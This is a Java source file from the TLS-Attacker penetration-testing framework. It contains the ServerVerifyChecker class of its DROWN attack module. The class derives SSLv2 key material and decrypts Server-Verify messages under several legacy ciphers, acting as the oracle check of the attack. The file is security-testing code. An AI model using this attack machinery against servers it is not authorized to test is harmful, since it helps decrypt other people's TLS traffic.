/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS
 *
 * Copyright 2014-2021 Ruhr University Bochum, Paderborn University, Hackmanit GmbH
 *
 * Licensed under Apache License, Version 2.0
 * http://www.apache.org/licenses/LICENSE-2.0.txt
 */

package de.rub.nds.tlsattacker.attacks.impl.drown;

import de.rub.nds.modifiablevariable.util.ArrayConverter;
import de.rub.nds.tlsattacker.core.constants.HandshakeMessageType;
import de.rub.nds.tlsattacker.core.constants.SSL2CipherSuite;
import de.rub.nds.tlsattacker.core.constants.ssl.SSL2ByteLength;
import de.rub.nds.tlsattacker.core.protocol.message.SSL2ServerVerifyMessage;
import de.rub.nds.tlsattacker.core.state.TlsContext;
import java.nio.charset.Charset;
import java.util.Arrays;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.bouncycastle.crypto.BlockCipher;
import org.bouncycastle.crypto.digests.MD5Digest;
import org.bouncycastle.crypto.engines.DESEngine;
import org.bouncycastle.crypto.engines.DESedeEngine;
import org.bouncycastle.crypto.engines.RC2Engine;
import org.bouncycastle.crypto.engines.RC4Engine;
import org.bouncycastle.crypto.modes.CBCBlockCipher;
import org.bouncycastle.crypto.params.DESParameters;
import org.bouncycastle.crypto.params.KeyParameter;
import org.bouncycastle.crypto.params.ParametersWithIV;

/**
 * Checks if a Server-Verify message successfully decrypts to the expected Client Random value, i.e. the client's
 * challenge. TLS-Attacker's SSLv2 implementation does not actually implement symmetric encryption, so we build the
 * minimal required parts here.
 */
public class ServerVerifyChecker {

    private static final Logger LOGGER = LogManager.getLogger();

    /**
     * Checks if the given message decrypts to the Client Random value from the given TLS context under the cipher suite
     * from the TLS context.
     *
     * @return True for successful decryption to the expected value
     */
    public static boolean check(SSL2ServerVerifyMessage message, TlsContext context, boolean decreaseLogNoise) {
        SSL2CipherSuite cipherSuite = context.getChooser().getSSL2CipherSuite();
        byte[] decryptedPart;

        switch (cipherSuite) {
            case SSL_CK_RC4_128_WITH_MD5:
            case SSL_CK_RC4_128_EXPORT40_WITH_MD5:
                decryptedPart = decryptRC4(message, context);
                break;
            case SSL_CK_RC2_128_CBC_WITH_MD5:
            case SSL_CK_RC2_128_CBC_EXPORT40_WITH_MD5:
                decryptedPart = decryptRC2(message, context);
                break;
            case SSL_CK_DES_64_CBC_WITH_MD5:
                decryptedPart = decryptCbcDes(message, context);
                break;
            case SSL_CK_DES_192_EDE3_CBC_WITH_MD5:
                decryptedPart = decryptCbcDesEde3(message, context);
                break;
            default:
                throw new UnsupportedOperationException("Check not implemented for the selected cipher suite");
        }
        return compareDecrypted(decryptedPart, context.getClientRandom(), decreaseLogNoise);
    }

    public static boolean compareDecrypted(byte[] decrypted, byte[] clientRandom, boolean silent) {
        if (decrypted.length <= SSL2ByteLength.MAC_DATA + SSL2ByteLength.MESSAGE_TYPE) {
            LOGGER.warn("Decrypted Server-Verify message is too short");
            return false;
        }
        int typeOffset = SSL2ByteLength.MAC_DATA;
        // All protocol fields after the record header are part of the message
        if (decrypted[typeOffset] != HandshakeMessageType.SSL2_SERVER_VERIFY.getValue()) {
            if (!silent) {
                LOGGER.warn("Wrong message type in decrypted Server-Verify message");
            }
            return false;
        }
        int challengeOffset = typeOffset + SSL2ByteLength.MESSAGE_TYPE;
        byte[] decryptedChallenge = Arrays.copyOfRange(decrypted, challengeOffset, decrypted.length);

        return Arrays.equals(decryptedChallenge, clientRandom);
    }

    private static byte[] decryptRC4(SSL2ServerVerifyMessage message, TlsContext context) {
        byte[] clientReadKey = makeKeyMaterial(context, "0");
        byte[] encrypted = message.getEncryptedPart().getValue();

        return decryptRC4(clientReadKey, encrypted);
    }

    static byte[] decryptRC4(byte[] clientReadKey, byte[] encrypted) {
        RC4Engine rc4 = new RC4Engine();
        rc4.init(false, new KeyParameter(clientReadKey));

        int len = encrypted.length;
        byte[] decrypted = new byte[len];
        rc4.processBytes(encrypted, 0, len, decrypted, 0);

        return decrypted;
    }

    private static byte[] decryptRC2(SSL2ServerVerifyMessage message, TlsContext context) {
        byte[] clientReadKey = makeKeyMaterial(context, "0");
        byte[] iv = context.getSSL2Iv();

        return decryptRC2(clientReadKey, message.getEncryptedPart().getValue(), iv,
            message.getPaddingLength().getValue());
    }

    static byte[] decryptRC2(byte[] clientReadKey, byte[] encrypted, byte[] iv, int paddingLength) {
        CBCBlockCipher cbcRc2 = new CBCBlockCipher(new RC2Engine());
        ParametersWithIV cbcRc2Params = new ParametersWithIV(new KeyParameter(clientReadKey), iv);
        cbcRc2.init(false, cbcRc2Params);

        return processEncryptedBlocks(cbcRc2, encrypted, paddingLength);
    }

    private static byte[] decryptCbcDes(SSL2ServerVerifyMessage message, TlsContext context) {
        // The RFC draft tells us to not include an index, but (against OpenSSL)
        // it only works when using "0"
        byte[] keyMaterial = makeKeyMaterial(context, "0");
        byte[] clientReadKey = Arrays.copyOfRange(keyMaterial, 0, 8);
        // According to the RFC draft, DES keys must be parity-adjusted, though
        // it won't matter much in practice
        DESParameters.setOddParity(clientReadKey);
        byte[] iv = context.getSSL2Iv();

        CBCBlockCipher cbcDes = new CBCBlockCipher(new DESEngine());
        ParametersWithIV cbcDesParams = new ParametersWithIV(new DESParameters(clientReadKey), iv);
        cbcDes.init(false, cbcDesParams);

        return processEncryptedBlocks(cbcDes, message.getEncryptedPart().getValue(),
            message.getPaddingLength().getValue());
    }

    private static byte[] decryptCbcDesEde3(SSL2ServerVerifyMessage message, TlsContext context) {
        byte[] clientReadKey = new byte[24];
        byte[] keyMaterial0 = makeKeyMaterial(context, "0");
        System.arraycopy(keyMaterial0, 0, clientReadKey, 0, keyMaterial0.length);
        byte[] keyMaterial1 = makeKeyMaterial(context, "1");
        System.arraycopy(keyMaterial1, 0, clientReadKey, keyMaterial0.length, 8);
        byte[] iv = context.getSSL2Iv();

        CBCBlockCipher cbcDesEde = new CBCBlockCipher(new DESedeEngine());
        ParametersWithIV params = new ParametersWithIV(new KeyParameter(clientReadKey), iv);
        cbcDesEde.init(false, params);

        return processEncryptedBlocks(cbcDesEde, message.getEncryptedPart().getValue(),
            message.getPaddingLength().getValue());
    }

    /**
     * Computes KEY-MATERIAL from information contained in the TLS context using MD5.
     *
     * @param tlsContext
     *                   The TLS context to get information for key derivation from.
     * @param index
     *                   Additional characters to mix into key derivation. This will usually either be an empty String,
     *                   or one of "0" and "1" for KEY-MATERIAL-0 resp. KEY-MATERIAL-1.
     */
    private static byte[] makeKeyMaterial(TlsContext tlsContext, String index) {
        SSL2CipherSuite cipherSuite = tlsContext.getChooser().getSSL2CipherSuite();

        byte[] clearKey = tlsContext.getClearKey();

        // The Premaster Secret is equivalent to SECRET-KEY-DATA
        byte[] secretKey = tlsContext.getPreMasterSecret();
        if (clearKey.length != cipherSuite.getClearKeyByteNumber()) {
            // Special DROWN with "extra clear" oracle
            int remainingLength = secretKey.length - (clearKey.length - cipherSuite.getClearKeyByteNumber());
            secretKey = Arrays.copyOfRange(secretKey, 0, remainingLength);
        }

        byte[] masterKey = ArrayConverter.concatenate(clearKey, secretKey);
        return makeKeyMaterial(masterKey, tlsContext.getClientRandom(), tlsContext.getServerRandom(), index);
    }

    static byte[] makeKeyMaterial(byte[] masterKey, byte[] clientRandom, byte[] serverRandom, String index) {
        MD5Digest md5 = new MD5Digest();
        md5Update(md5, masterKey);
        md5Update(md5, index.getBytes(Charset.forName("US-ASCII")));
        md5Update(md5, clientRandom);
        md5Update(md5, serverRandom);

        byte[] md5Output = new byte[md5.getDigestSize()];
        md5.doFinal(md5Output, 0);
        return md5Output;
    }

    private static void md5Update(MD5Digest md5, byte[] bytes) {
        md5.update(bytes, 0, bytes.length);
    }

    private static byte[] processEncryptedBlocks(BlockCipher cipher, byte[] encrypted, int paddingLength) {
        if (encrypted.length % cipher.getBlockSize() != 0) {
            LOGGER.warn("Server-Verify payload has invalid length");
            return new byte[0];
        }

        byte[] decrypted = new byte[encrypted.length];
        int processedLength = 0;
        while (processedLength < encrypted.length) {
            processedLength += cipher.processBlock(encrypted, processedLength, decrypted, processedLength);
        }

        return Arrays.copyOfRange(decrypted, 0, decrypted.length - paddingLength);
    }

}
